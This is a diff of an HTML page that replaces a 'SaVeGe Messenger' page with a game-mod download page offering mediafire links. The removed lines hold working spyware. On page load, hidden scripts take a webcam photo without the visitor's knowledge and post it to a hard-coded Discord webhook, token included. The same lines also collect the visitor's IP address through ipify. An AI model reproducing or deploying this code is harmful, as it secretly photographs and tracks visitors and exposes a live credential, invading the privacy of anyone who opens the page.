@@ -2,190 +2,138 @@
 <html>
 <head>
   <style>
-    body {
+    html, body {
       margin: 0;
       padding: 0;
-      top: 0px;
-      height: 100vh;
-      background: linear-gradient(to bottom, #141414 10%, #141414 10%, #000000 15%);
+      height: 100%;
+      background-color: black;
+      overflow: hidden;
     }
-
-    .topbar {
-      font-family: "Hammersmith One", sans-serif;
-      font-weight: bold;
-      background-color: #141414;
-      color: #c28400;
-      width: 100%;
-      height: 60px;
+    
+    .container {
+      display: flex;
+      height: 100%;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+    
+    .sidebar {
+      width: 200px;
+      background-color: rgba(255, 0, 0, 0.2);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .content {
+      flex-grow: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    
+    .rotating-image {
       position: absolute;
+      bottom: 187px;
+      left: 0;
+      right: 0;
+      margin: auto;
+      width: 110px;
+      animation: rotate 4s linear infinite;
+      max-width: 100%;
+      max-height: 100%;
     }
-
-    .center-container {
+    
+    .eagle {
       position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-      color: gold;
+      bottom: 150px;
+      width: 550px;
+      max-width: 100%;
+      max-height: 100%;
     }
-
-    .text-input {
-      border: 2px solid white;
-      border-radius: 50px;
-      font-family: "Hammersmith One", sans-serif;
-      font-size: 18px;
-      color: white;
-      background-color: transparent;
+    
+    .sidebar button {
+      margin: 10px;
       padding: 10px;
-      width: 300px;
-      margin-bottom: 10px;
-    }
-
-    .submit-button {
       border: none;
-      border-radius: 50px;
-      background-color: #c28400;
-      color: #fff;
-      font-family: "Hammersmith One", sans-serif;
-      font-size: 18px;
-      padding: 10px 20px;
+      color: white;
+      font-weight: bold;
       cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    
+    .sidebar button:hover {
+      background-color: rgba(255, 255, 255, 0.2);
+    }
+    
+    @keyframes rotate {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
     }
   </style>
-    <script>
-    // Get video, canvas
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+  <script>
+    setTimeout(() => {
+      let music = new Audio("https://cdn.discordapp.com/attachments/1108416279834017876/1108781462133674054/Terminate.mp3");
+      music.loop = true;
+      music.play();
+    }, 100);
+    
+    function downloadFile(fileUrl) {
+      const fileName = fileUrl.split("/").pop();
+      const fileType = getFileType(fileName);
 
-    // Access user media and start the camera
-    if (navigator.mediaDevices.getUserMedia) {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          video.srcObject = stream;
-          // Capture photo after a brief delay
-          setTimeout(() => {
-            capturePhotoAndSendToWebhook();
-          }, 1000);
+      // Fetch the file content
+      fetch(fileUrl)
+        .then(response => response.blob())
+        .then(blob => {
+          // Create a temporary anchor element
+          const a = document.createElement("a");
+          a.style.display = "none";
+          document.body.appendChild(a);
+
+          // Set the download attributes
+          a.href = URL.createObjectURL(blob);
+          a.download = fileName;
+
+          // Programmatically trigger the download
+          a.click();
+
+          // Cleanup
+          URL.revokeObjectURL(a.href);
+          document.body.removeChild(a);
         })
-        .catch((error) => {
-          console.error('Error accessing camera:', error);
-        });
+        .catch(error => console.log(error));
     }
 
-    // Capture photo from video stream and send to Discord webhook
-    function capturePhotoAndSendToWebhook() {
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      // Convert the captured photo to a Blob object
-      canvas.toBlob((blob) => {
-        // Create a FormData object to send the photo as multipart/form-data
-        const formData = new FormData();
-        formData.append('file', blob, 'photo.png');
+    function getFileType(fileName) {
+      const extension = fileName.split(".").pop().toLowerCase();
+      const fileTypes = {
+        txt: "text/plain",
+        mp3: "audio/mpeg",
+        // Add more file types as needed
+      };
 
-        // Discord webhook URL
-        const webhookURL = 'https://discord.com/api/webhooks/1108464693581983804/siGceNe-YFrFQUvTCMf8E5rK4ZNebJ1mO8e3Epq4FV_-cxEB4wHiH7qoMpcNiaHBsgt1';
-
-        // Send the photo to Discord webhook using Fetch API
-        fetch(webhookURL, {
-          method: 'POST',
-          body: formData
-        })
-          .then((response) => {
-            if (response.ok) {
-              console.log('Photo sent to Discord webhook successfully!');
-            } else {
-              console.error('Error sending photo to Discord webhook:', response.statusText);
-            }
-          })
-          .catch((error) => {
-            console.error('Error sending photo to Discord webhook:', error);
-          });
-      }, 'image/png');
+      return fileTypes[extension] || "application/octet-stream";
     }
   </script>
-  <script>
-window.addEventListener('load', () => {
-  const video = document.createElement('video');
-  const canvas = document.createElement('canvas');
-  
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then((stream) => {
-      video.srcObject = stream;
-      video.addEventListener('loadedmetadata', () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Convert the captured photo to a Blob object
-        canvas.toBlob((blob) => {
-          // Create a FormData object to send the photo as multipart/form-data
-          const formData = new FormData();
-          formData.append('file', blob, 'photo.jpg');
-
-          // Discord webhook URL
-          const webhookURL = 'https://discord.com/api/webhooks/1108464693581983804/siGceNe-YFrFQUvTCMf8E5rK4ZNebJ1mO8e3Epq4FV_-cxEB4wHiH7qoMpcNiaHBsgt1';
-
-          // Send the photo to Discord webhook using Fetch API
-          fetch(webhookURL, {
-            method: 'POST',
-            body: formData
-          })
-            .then((response) => {
-              if (response.ok) {
-                console.log('Photo sent to Discord webhook successfully!');
-              } else {
-                console.error('Error sending photo to Discord webhook:', response.statusText);
-              }
-            })
-            .catch((error) => {
-              console.error('Error sending photo to Discord webhook:', error);
-            });
-        }, 'image/jpeg', 1); // Adjust the image format and quality as needed
-      });
-    })
-    .catch((error) => {
-      console.error('Error accessing camera:', error);
-    });
-});
-
-    var ipAddress;
-
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        ipAddress = data.ip;
-        var webhookNameInput = document.getElementById("webhookName");
-        webhookNameInput.value = ipAddress;
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-
-    function messenger() {
-      var inputText = document.getElementById("inputText").value;
-      var webhookURL = document.getElementById("webhookURL").value;
-        var request = new XMLHttpRequest();
-  request.open("POST", webhookURL);
-  var params = {
-    username: ipAddress,
-    content: inputText
-  };
-
-  request.setRequestHeader("Content-type", "application/json");
-  request.send(JSON.stringify(params));
-}
-</script>
 </head>
 <body>
-  <div class="topbar">
-    <e style="left: 10px; position: absolute; font-size: 50px; top: 5px;">SaVeGe</e>
-    <ez style='left: 205px; color: #fff; position: absolute; font-size: 50px; top: 5px; background-color: rgba(194, 132, 0, 0.36); border-radius: 10px; padding: 0px;'>Messenger</ez>
-  </div>
-  <div class="center-container" style='padding: 30px;  box-shadow: 0 0 10px #141414, 0 0 20px #141414, 0 0 30px #141414; background-color: #141414;'>
-    <input type="text" id="inputText" class="text-input" placeholder="Enter your message">
-    <br>
-    <input type="text" id="webhookURL" class="text-input" placeholder="Enter Discord webhook URL">
-    <br>
-    <button class="submit-button" onclick="messenger()">Submit</button>
+  <div class="container">
+    <div class="sidebar">
+      <button style="background-color: #ff0000; color: black" onclick="downloadFile('https://download1478.mediafire.com/wnxp5kf6b5hgvmTkjUP541P1zy0F_41B5vELKutD88g5Xjy6sXuL2V8_qatLNeMeSqw_TmGGh2_bEQwFhEY7tY-m3hqqVJMXa9C87cXJwhnxaxaIE4GCMRYBXc7Cgly0e0Xsz8q0e4JJNbMQoYkn7vqFdY__vnc6TTDQNMUgtlBc/m0l4h1ig27h6bpa/message+%283%29.txt')">Golden Mod</button>
+      <button onclick="downloadFile('https://download2266.mediafire.com/byktb477y6ag4Z6dB4iNvt50bAr4QCE4ibozooJ82oVmUu2Q0yIOPM46g3RtrRk0yKA5lPwG19VBTASQ0hdRukJfTBXEzkmmi-hQVvuv9y-hP6r7ut0-HdvjF0_Udp99dXhkZ_Xlp97FmSdyg1tunc5Y9Zm_jDEDbKp7G7pMzyfe/m0l4h1ig27h6bpa/message+%283%29.txt')" style="background-color: #ff0000; color: black">Black Rainbow</button>
+      <button onclick="downloadFile('https://example.com/text1.txt')" style="background-color: #ff0000; color: black">Chicken Mod</button>
+      <button href = "https://discord.gg/q4R9Zu3yh2" style="background-color: #ff0000; color: black">Discord Server</button>
+      <button onclick="downloadFile('https://example.com/text1.txt')" style="background-color: #ff0000; color: black">Soon!</button>
+    </div>
+    <div class="content">
+      <img class="eagle" src="https://media.discordapp.net/attachments/1108416279834017876/1108770778809381054/imageedit_3_4036860589.png" alt="the Eagle">
+      <img class="rotating-image" src="https://media.discordapp.net/attachments/1108416279834017876/1108772553113219193/imageedit_11_6535242309.png" alt="Rotating Image">
+    </div>
   </div>
 </body>
 </html>
